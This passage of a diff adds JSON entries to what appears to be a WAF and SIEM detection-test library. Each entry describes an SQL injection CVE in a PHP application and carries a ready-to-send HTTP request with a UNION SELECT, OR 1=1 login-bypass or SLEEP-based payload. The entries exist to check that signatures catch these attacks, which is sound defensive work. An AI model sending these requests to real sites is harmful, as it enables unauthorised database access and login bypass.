+      "input": "GET /update_stock.php?sid=-1%20UNION%20SELECT%201,2,3,4,5--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4826"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4826",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-UpdateStock-sid.md"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4826",
+        "link": "https://vuldb.com/?id.353126"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4825 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4825 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection via the sid argument of /update_sales.php (HTTP GET Parameter Handler). The request submits a UNION SELECT SQL injection payload in the sid query parameter, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the VulDB-style CVE description and PoC (the CVE states an HTTP GET parameter).\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-UpdateSales-sid.md (PoC - GitHub, unreachable in this environment)\n- https://vuldb.com/?id.353125 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-4825 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /update_sales.php?sid=-1%20UNION%20SELECT%201,2,3,4,5--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4825"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4825",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-UpdateSales-sid.md"
+      },
+      {
+        "title": "advisory_vuldb for CVE-2026-4825",
+        "link": "https://vuldb.com/?id.353125"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4817 - MasterStudy LMS WordPress Plugin SQL Injection",
+    "displayName": "CVE-2026-4817 - MasterStudy LMS WordPress Plugin SQL Injection",
+    "description": "The MasterStudy LMS WordPress plugin (<= 3.7.25) is vulnerable to time-based blind SQL injection via the 'order'/'orderby' sort parameters of the stm-lms/order/items REST API endpoint; the custom Query builder treats parenthesised values as SQL functions and concatenates them unquoted into the ORDER BY clause. The request submits a time-based (SLEEP) payload in orderby, matching an OWASP CRS 942 SQLi signature. Requires subscriber-level access (dummy auth cookie/nonce included). Source references from Wordfence/trac; the WP REST /wp-json prefix was added to the advisory's route and GET inferred for this listing endpoint.\n\nReferences used to recreate this request:\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/7a51fe96-f3d3-46fe-9e3a-fb7c1bd17b05?source=cve (advisory)\n- https://plugins.trac.wordpress.org/browser/masterstudy-lms-learning-management-system/trunk/_core/lms/classes/vendor/Query.php#L676 (fix/source - ORDER BY builder)\n- https://www.cve.org/CVERecord?id=CVE-2026-4817 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /wp-json/stm-lms/order/items?orderby=(SELECT(SLEEP(5)))&order=ASC HTTP/1.1\nHost: {{target_host}}\nX-WP-Nonce: dummy\nCookie: wordpress_logged_in_dummy=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4817"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "waf_rule_wordfence for CVE-2026-4817",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/7a51fe96-f3d3-46fe-9e3a-fb7c1bd17b05?source=cve"
+      },
+      {
+        "title": "source_trac for CVE-2026-4817",
+        "link": "https://plugins.trac.wordpress.org/browser/masterstudy-lms-learning-management-system/trunk/_core/lms/classes/vendor/Query.php#L676"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4815 - Schiocco Support Board SQL Injection",
+    "displayName": "CVE-2026-4815 - Schiocco Support Board SQL Injection",
+    "description": "Schiocco Support Board <= 3.7.7 is vulnerable to SQL injection via the 'calls[0][message_ids][]' parameter of the /supportboard/include/ajax.php endpoint (the batched 'calls' dispatcher). The request submits a time-based (SLEEP) SQL injection payload in the message_ids array value, matching an OWASP CRS 942 SQLi signature. No vendor WAF rule found; built from the INCIBE advisory (POST to ajax.php; the batched-call wrapper function name is inferred, the injected parameter name is from the advisory).\n\nReferences used to recreate this request:\n- https://www.incibe.es/en/incibe-cert/notices/aviso/multiple-vulnerabilities-support-board-schiocco (advisory - INCIBE)\n- https://www.cve.org/CVERecord?id=CVE-2026-4815 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /supportboard/include/ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nfunction=calls&calls[0][function]=messages-mark&calls[0][message_ids][]=1)+OR+SLEEP(5)--+-\n"
+    },
+    "cves": [
+      "CVE-2026-4815"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "advisory_incibe for CVE-2026-4815",
+        "link": "https://www.incibe.es/en/incibe-cert/notices/aviso/multiple-vulnerabilities-support-board-schiocco"
+      },
+      {
+        "title": "cve_record for CVE-2026-4815",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4815"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4580 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-4580 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection in the serviceId argument of /checkupdatestatus.php (Parameters Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in serviceId, matching OWASP CRS 942 signatures. No vendor WAF rule found; built from the VulDB advisory entry point. HTTP method inferred as GET (serviceId is an id/status-lookup argument); flagged as an inference.\n\nReferences used to recreate this request:\n- https://github.com/anon387tdug/anon388/issues/2 (PoC)\n- https://vuldb.com/?id.352417 (VulDB advisory - file + argument entry point)\n- https://www.cve.org/CVERecord?id=CVE-2026-4580 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /checkupdatestatus.php?serviceId=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4580"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4580",
+        "link": "https://github.com/anon387tdug/anon388/issues/2"
+      },
+      {
+        "title": "vuldb for CVE-2026-4580",
+        "link": "https://vuldb.com/?id.352417"
+      },
+      {
+        "title": "cve_record for CVE-2026-4580",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4580"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4579 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-4579 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection in the serviceId argument of /viewdetail.php (Parameters Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in serviceId, matching OWASP CRS 942 signatures. No vendor WAF rule found; built from the VulDB advisory entry point. HTTP method inferred as GET (viewdetail is a view-by-id detail page); flagged as an inference.\n\nReferences used to recreate this request:\n- https://github.com/anon387tdug/anon388/issues/3 (PoC)\n- https://vuldb.com/?id.352416 (VulDB advisory - file + argument entry point)\n- https://www.cve.org/CVERecord?id=CVE-2026-4579 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /viewdetail.php?serviceId=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4579"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4579",
+        "link": "https://github.com/anon387tdug/anon388/issues/3"
+      },
+      {
+        "title": "vuldb for CVE-2026-4579",
+        "link": "https://vuldb.com/?id.352416"
+      },
+      {
+        "title": "cve_record for CVE-2026-4579",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4579"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4573 - SourceCodester Simple E-learning System SQL Injection",
+    "displayName": "CVE-2026-4573 - SourceCodester Simple E-learning System SQL Injection",
+    "description": "SourceCodester Simple E-learning System 1.0 is vulnerable to SQL injection in the post_id argument of /includes/form_handlers/delete_post.php (HTTP GET Parameter Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in post_id, matching OWASP CRS 942 signatures. HTTP GET method is stated in the advisory and confirmed via gh code search. No vendor WAF rule found; built from the PoC/VulDB advisory.\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Simple-E-learning-System/SQLi-DeletePost-postId.md (PoC)\n- https://vuldb.com/?id.352410 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4573 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /includes/form_handlers/delete_post.php?post_id=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4573"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4573",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Simple-E-learning-System/SQLi-DeletePost-postId.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4573",
+        "link": "https://vuldb.com/?id.352410"
+      },
+      {
+        "title": "cve_record for CVE-2026-4573",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4573"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4572 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4572 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection in the searchtxt argument of /view_product.php (HTTP POST Request Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in the searchtxt POST field, matching OWASP CRS 942 signatures. HTTP POST method is stated in the advisory and confirmed via gh code search. No vendor WAF rule found; built from the PoC/VulDB advisory.\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewProduct-searchtxt.md (PoC)\n- https://vuldb.com/?id.352409 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4572 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /view_product.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsearchtxt=%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2026-4572"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4572",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewProduct-searchtxt.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4572",
+        "link": "https://vuldb.com/?id.352409"
+      },
+      {
+        "title": "cve_record for CVE-2026-4572",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4572"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4571 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4571 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection in the searchtxt argument of /view_payments.php (HTTP POST Request Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in the searchtxt POST field, matching OWASP CRS 942 signatures. HTTP POST method is stated in the advisory and confirmed via gh code search. No vendor WAF rule found; built from the PoC/VulDB advisory.\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewPayments-searchtxt.md (PoC)\n- https://vuldb.com/?id.352408 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4571 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /view_payments.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsearchtxt=%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2026-4571"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4571",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewPayments-searchtxt.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4571",
+        "link": "https://vuldb.com/?id.352408"
+      },
+      {
+        "title": "cve_record for CVE-2026-4571",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4571"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4570 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4570 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection in the searchtxt argument of /view_customers.php (HTTP POST Request Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in the searchtxt POST field, matching OWASP CRS 942 signatures. HTTP POST method is stated in the advisory and confirmed via gh code search. No vendor WAF rule found; built from the PoC/VulDB advisory.\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewCustomers-searchtxt.md (PoC)\n- https://vuldb.com/?id.352407 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4570 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /view_customers.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsearchtxt=%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2026-4570"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4570",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewCustomers-searchtxt.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4570",
+        "link": "https://vuldb.com/?id.352407"
+      },
+      {
+        "title": "cve_record for CVE-2026-4570",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4570"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4569 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4569 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection in the searchtxt argument of /view_category.php (HTTP POST Request Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in the searchtxt POST field, matching OWASP CRS 942 signatures. HTTP POST method is stated in the advisory and confirmed via gh code search. No vendor WAF rule found; built from the PoC/VulDB advisory.\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewCategory-searchtxt.md (PoC)\n- https://vuldb.com/?id.352406 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4569 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /view_category.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nsearchtxt=%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2026-4569"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4569",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-ViewCategory-searchtxt.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4569",
+        "link": "https://vuldb.com/?id.352406"
+      },
+      {
+        "title": "cve_record for CVE-2026-4569",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4569"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4568 - SourceCodester Sales and Inventory System SQL Injection",
+    "displayName": "CVE-2026-4568 - SourceCodester Sales and Inventory System SQL Injection",
+    "description": "SourceCodester Sales and Inventory System 1.0 is vulnerable to SQL injection in the sid argument of /update_supplier.php (HTTP GET Request Handler). The request sends a boolean-based SQLi payload (' OR 1=1-- -) in sid, matching OWASP CRS 942 signatures. HTTP GET method is stated in the advisory. No vendor WAF rule found; built from the PoC/VulDB advisory.\n\nReferences used to recreate this request:\n- https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-UpdateSupplier-sid.md (PoC)\n- https://vuldb.com/vuln/352405 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4568 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /update_supplier.php?sid=%27%20OR%201%3D1--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4568"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4568",
+        "link": "https://github.com/meifukun/Web-Security-PoCs/blob/main/Inventory-System/SQLi-UpdateSupplier-sid.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4568",
+        "link": "https://vuldb.com/vuln/352405"
+      },
+      {
+        "title": "cve_record for CVE-2026-4568",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4568"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4550 - code-projects Simple Gym Management System SQL Injection",
+    "displayName": "CVE-2026-4550 - code-projects Simple Gym Management System SQL Injection",
+    "description": "code-projects Simple Gym Management System 1.0 is vulnerable to time-based blind SQL injection in the Trainer_id argument of /gym/func.php. The request sends a time-based SQLi payload (1' AND SLEEP(5)-- -) in the Trainer_id field, matching OWASP CRS 942 signatures. No vendor WAF rule found; built from the PoC/VulDB advisory. HTTP method inferred as POST (func.php is a form/action handler taking Trainer_id and fname); flagged as an inference.\n\nReferences used to recreate this request:\n- https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/Time-Based%20Blind%20SQL%20Injection%20in%20%20Simple%20Gym%20Management%20System%20in%20PHP%20Product.md (PoC)\n- https://vuldb.com/?id.352377 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4550 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /gym/func.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nTrainer_id=1%27+AND+SLEEP(5)--+-&fname=x\n"
+    },
+    "cves": [
+      "CVE-2026-4550"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4550",
+        "link": "https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/Time-Based%20Blind%20SQL%20Injection%20in%20%20Simple%20Gym%20Management%20System%20in%20PHP%20Product.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4550",
+        "link": "https://vuldb.com/?id.352377"
+      },
+      {
+        "title": "cve_record for CVE-2026-4550",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4550"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4540 - projectworlds Online Notes Sharing System SQL Injection",
+    "displayName": "CVE-2026-4540 - projectworlds Online Notes Sharing System SQL Injection",
+    "description": "projectworlds Online Notes Sharing System 1.0 is vulnerable to SQL injection in the User argument of /login.php (Parameters Handler). The request sends a boolean-based SQLi auth-bypass payload (' OR 1=1-- -) in the User login field, matching OWASP CRS 942 signatures. No vendor WAF rule found; built from the PoC/VulDB advisory. HTTP method inferred as POST (login form submission); flagged as an inference.\n\nReferences used to recreate this request:\n- https://github.com/juzidddd/CVE/issues/4 (PoC)\n- https://vuldb.com/?id.352357 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4540 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /login.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\nUser=%27+OR+1%3D1--+-&pass=dummy\n"
+    },
+    "cves": [
+      "CVE-2026-4540"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4540",
+        "link": "https://github.com/juzidddd/CVE/issues/4"
+      },
+      {
+        "title": "vuldb for CVE-2026-4540",
+        "link": "https://vuldb.com/?id.352357"
+      },
+      {
+        "title": "cve_record for CVE-2026-4540",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4540"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-4533 - code-projects Simple Food Ordering System SQL Injection",
+    "displayName": "CVE-2026-4533 - code-projects Simple Food Ordering System SQL Injection",
+    "description": "code-projects Simple Food Ordering System 1.0 is vulnerable to time-based blind SQL injection in the Status argument of /all-tickets.php. The request sends a time-based SQLi payload (1' AND SLEEP(5)-- -) in the Status field, matching OWASP CRS 942 signatures. No vendor WAF rule found; built from the PoC/VulDB advisory. HTTP method inferred as GET (Status is a listing-filter argument); flagged as an inference.\n\nReferences used to recreate this request:\n- https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/SQL%20Injection%20(Time-Based%20Blind)Simple%20Food%20Ordering%20System%20in%20PHP.md (PoC)\n- https://vuldb.com/?id.352321 (VulDB advisory)\n- https://www.cve.org/CVERecord?id=CVE-2026-4533 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /all-tickets.php?Status=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-4533"
+    ],
+    "cwes": [
+      "CWE-89",
+      "CWE-74"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "CWE-74",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-4533",
+        "link": "https://github.com/ahmadmarz10-hub/CVEsMarz/blob/main/SQL%20Injection%20(Time-Based%20Blind)Simple%20Food%20Ordering%20System%20in%20PHP.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-4533",
+        "link": "https://vuldb.com/?id.352321"
+      },
+      {
+        "title": "cve_record for CVE-2026-4533",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-4533"
       }
     ],
     "public": false,
